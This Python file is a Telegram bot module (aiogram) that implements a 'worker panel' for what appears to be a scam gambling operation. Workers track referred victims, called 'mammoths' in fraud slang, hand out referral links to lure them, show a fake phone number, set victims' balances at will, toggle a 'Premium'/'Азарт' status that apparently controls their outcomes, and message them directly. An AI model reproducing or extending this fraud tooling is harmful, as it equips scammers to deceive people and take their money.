from aiogram import types
from aiogram.types import ChatType
from aiogram.dispatcher.filters.builtin import Text
from aiogram.dispatcher import FSMContext
from aiogram.utils.deep_linking import get_start_link
from aiogram.utils.exceptions import MessageNotModified
from aiogram.utils.emoji import emojize
from loguru import logger

from keyboards import worker_keyboards
from data.config import ADMINS_ID, FAKE_NUMBER
from data.states import WorkerPanel
from loader import dp
from models import User, UserHistory

"""
Воркер панель

Изменение баланса
Азарт статус
Вывод денег с ворка
"""

async def worker_info(chat_id: int):
	refs = len(User.select().where(User.refer == chat_id))		
	user = User.get(cid=chat_id)
	return emojize(f":snake: <i>Hide Team Panel</i> \
		\n\n:iphone: Текущий номер: <code>+{FAKE_NUMBER}</code>\
		\n:gem: Реф. Баланс: <b>{user.ref_balance} RUB</b> (Без учёта ТП) \
		\n:elephant: Мамонтов: <b>{refs}</b> \
		\n\n:bust_in_silhouette: Ссылка для мамонта: \n{await get_start_link(user.id)}")

""" worker panel """
@dp.message_handler(Text(startswith="ворк", ignore_case=True),
	chat_type=ChatType.PRIVATE, state="*")
async def worker_panel(message: types.Message):
	try:
		user = User.get(cid=message.chat.id)
		if user.worker:
			worker_text = await worker_info(message.chat.id)
			await message.answer(worker_text, reply_markup=worker_keyboards.main_menu_keyboard)
			await WorkerPanel.main.set()
	except User.DoesNotExist:
		logger.debug(f"#{message.chat.id} - does not exist")
	logger.info(f"#{message.chat.id} - try worker panel")

# @dp.message_handler(Text(contains="рас", ignore_case=True),
# 	chat_type=ChatType.PRIVATE, state=WorkerPanel.main)
# async def about_user(message: types.Message):

@dp.message_handler(Text(contains="юзер", ignore_case=True),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.main)
async def about_user(message: types.Message):
	await message.answer(emojize("Последние 3 мамонта :star:"),
		reply_markup=worker_keyboards.last_refers(message.chat.id))
	await message.answer("Введите id того, о ком хотите узнать",
		reply_markup=worker_keyboards.edit_balance_keyboard)
	await WorkerPanel.about_user.set()

@dp.message_handler(lambda mes: not mes.text.isdigit(),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.about_user)
async def about_user_invalid(message: types.Message):
	await message.reply("id человека, должен быть числом",
		reply_markup=worker_keyboards.edit_balance_keyboard)

async def all_refers(message: types.Message):
	try:
		user = User.get(cid=message.chat.id)
		fullinfo = ":elephant: Мамонтята"
		if user.worker:
			for refer in User.select().where(User.refer == message.chat.id).order_by(User.id.desc()).limit(25):
				user = User.get(cid=refer.cid)
				status = "Премиум" if user.premium else "Азарт"
				fullinfo += f"\n{user.username}, {status}, <b>{user.balance} RUB</b> [<code>{user.cid}</code>]"
			await message.answer(emojize(fullinfo))
	except User.DoesNotExist:
		logger.debug(f"worker #{message.chat.id} - does not exist")

async def about_user_text(cid):
	try:
		user = User.get(cid=cid)
		status = "<b>Премиум</b>" if user.premium else "<b>Азарт</b>"
		about_text = f"{user.username}, Баланс: <b>{user.balance} RUB</b>, {status} [<code>{user.cid}</code>]"
		history = "История баланса:"
		for edit in UserHistory.select().where(UserHistory.cid==cid).order_by(UserHistory.id.desc()).limit(14):
			act = "<i>Изменение</i> ="
			if edit.editor == 0:
				act = "<i>Пополнение</i> +"
			elif edit.editor == 1:
				act = "<i>Вывод</i> -"
			elif edit.editor == 2:
				act = "+"
			elif edit.editor == 3:
				act = "-"
			elif edit.editor == 4:
				act = "Авто Изменение ="
			history += f"\n{act}{edit.amount} RUB, <i>Баланс:</i> {edit.balance} RUB | {edit.created}"
		return f"{about_text}\n{history}"
	except User.DoesNotExist:
		pass

@dp.message_handler(chat_type=ChatType.PRIVATE, state=WorkerPanel.about_user)
async def about_user_complete(message: types.Message):
	if message.text == "0":
		await all_refers(message)
		return
	try:
		user = User.get(cid=message.text)
		if user.premium:
			about_markup = worker_keyboards.status_keyboard_pos(message.text) 
		else:
			about_markup = worker_keyboards.status_keyboard_neg(message.text)
		about_text = await about_user_text(message.text)
		await message.answer(about_text, reply_markup=about_markup)
		await WorkerPanel.main.set()
	except User.DoesNotExist:
		await message.answer("Такого юзера нету.")
		logger.debug(f"workp #{message.chat.id} - does not exist")

@dp.message_handler(Text(startswith="ник", ignore_case=True),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.main)
async def update_username(message: types.Message):
	try:
		user = User.get(cid=message.chat.id)
		if message.chat.username is None:
			await message.answer("У вас ещё нету юзернейма")
			return
		user.username = "@" + message.chat.username
		user.save()
		await message.answer(f"Теперь ваш никнейм: {user.username}",
			reply_markup=worker_keyboards.main_menu_keyboard)
	except User.DoesNotExist:
		logger.debug(f"worker #{message.chat.id} - does not exist")



@dp.message_handler(Text(startswith="изменить", ignore_case=True),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.main)
async def edit_balance(message: types.Message):
	await message.answer("Введите id того, кому хотите изменить баланс",
		reply_markup=worker_keyboards.edit_balance_keyboard)
	await WorkerPanel.edit_balance_id.set()

@dp.message_handler(lambda mes: not mes.text.isdigit(),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.edit_balance_id)
async def edit_amount_invalid(message: types.Message):
	await message.reply("id человека, должен быть числом",
		reply_markup=worker_keyboards.edit_balance_keyboard)

@dp.message_handler(chat_type=ChatType.PRIVATE, state=WorkerPanel.edit_balance_id)
async def edit_amount(message: types.Message, state: FSMContext):
	async with state.proxy() as data:
		data["chat_id"] = int(message.text)
	await message.answer("Введите, какой баланс сделать",
		reply_markup=worker_keyboards.edit_balance_keyboard)
	await WorkerPanel.edit_balance_amount.set()

@dp.message_handler(lambda mes: not mes.text.isdigit(),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.edit_balance_amount)
async def edit_complete_invalid(message: types.Message):
	await message.reply("Баланс - должен быть числом\n\nВведите, какой баланс сделать",
		reply_markup=worker_keyboards.edit_balance_keyboard)

@dp.message_handler(chat_type=ChatType.PRIVATE, state=WorkerPanel.edit_balance_amount)
async def edit_complete(message: types.Message, state: FSMContext):
	async with state.proxy() as data:
		try:
			user = User.get(cid=data['chat_id'])
			user.balance = int(message.text)
			user.premium = True
			user.save()
			UserHistory.create(cid=data['chat_id'], editor=message.chat.id,
				amount=message.text, balance=user.balance)
		except User.DoesNotExist:
			User.create(cid=data['chat_id'], balance=int(message.text), premium=True)
		finally:
			logger.info(f"#{message.chat.id} change balance to {data['chat_id']} - {message.text}")
	await message.answer("Баланс изменен успешно!")
	await state.finish()

@dp.callback_query_handler(lambda cb: cb.data.split("_")[0] == "status", 
	chat_type=ChatType.PRIVATE, state="*")
async def accept_user(call: types.CallbackQuery):
	cid = call.data.split("_")[1]
	try:
		user = User.get(cid=cid)
		user.premium = not user.premium
		user.save()
		if user.premium:
			about_markup = worker_keyboards.status_keyboard_pos(cid) 
		else:
			about_markup = worker_keyboards.status_keyboard_neg(cid)
		about_text = await about_user_text(cid)
		await call.message.edit_text(about_text, reply_markup=about_markup)
		await call.answer("Статус изменен!")
	except User.DoesNotExist:
		logger.info(f"#{cid} - does not exist")


@dp.callback_query_handler(lambda cb: cb.data.split("_")[0] == "update", 
	chat_type=ChatType.PRIVATE, state="*")
async def accept_user(call: types.CallbackQuery):
	cid = call.data.split("_")[1]
	try:
		user = User.get(cid=cid)
		if user.premium:
			about_markup = worker_keyboards.status_keyboard_pos(cid) 
		else:
			about_markup = worker_keyboards.status_keyboard_neg(cid)
		about_text = await about_user_text(cid)
		try:
			await call.message.edit_text(about_text, reply_markup=about_markup)
		except MessageNotModified:
			pass
		finally:
			await call.answer("Обновлено!")
			await WorkerPanel.main.set()
	except User.DoesNotExist:
		logger.info(f"#{cid} - does not exist")

@dp.message_handler(Text(startswith="сообщ", ignore_case=True),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.main)
async def notify_mamonth(message: types.Message):
	await message.answer("Введите id того, кому хотите отправить сообщение",
		reply_markup=worker_keyboards.edit_balance_keyboard)
	await WorkerPanel.notify_id.set()

@dp.message_handler(lambda mes: not mes.text.isdigit(),
	chat_type=ChatType.PRIVATE, state=WorkerPanel.notify_id)
async def notify_id_invalid(message: types.Message):
	await message.reply("id человека, должен быть числом",
		reply_markup=worker_keyboards.edit_balance_keyboard)

@dp.message_handler(chat_type=ChatType.PRIVATE, state=WorkerPanel.notify_id)
async def notify_id(message: types.Message, state: FSMContext):
	try:
		user = User.get(cid=message.text)
		await message.reply("Введите текст сообщения",
			reply_markup=worker_keyboards.edit_balance_keyboard)
		async with state.proxy() as data:
			data['cid'] = message.text
		await WorkerPanel.notify_text.set()
	except User.DoesNotExist:
		await message.answer("Такого юзера нету!",
			reply_markup=worker_keyboards.main_menu_keyboard)
		await WorkerPanel.main.set()

@dp.message_handler(chat_type=ChatType.PRIVATE, state=WorkerPanel.notify_text)
async def notify_mamonth_text(message: types.Message, state: FSMContext):
	async with state.proxy() as data:
		cid = data['cid']
		data['text'] = message.text
	await message.answer(f"Вы уверенны, что хотите отправить сообщение?\n[<code>{cid}</code>]",
		reply_markup=worker_keyboards.notify_sure)
	await WorkerPanel.notify_sure.set()

@dp.callback_query_handler(text="notify", chat_type=ChatType.PRIVATE, state=WorkerPanel.notify_sure)
async def notify_mamonth_complete(call: types.CallbackQuery, state: FSMContext):
	async with state.proxy() as data:
		await dp.bot.send_message(data['cid'], data['text'])
	await call.answer("Сообщение отправленно!")
	await call.message.delete()
	await worker_panel(call.message)
	await WorkerPanel.main.set()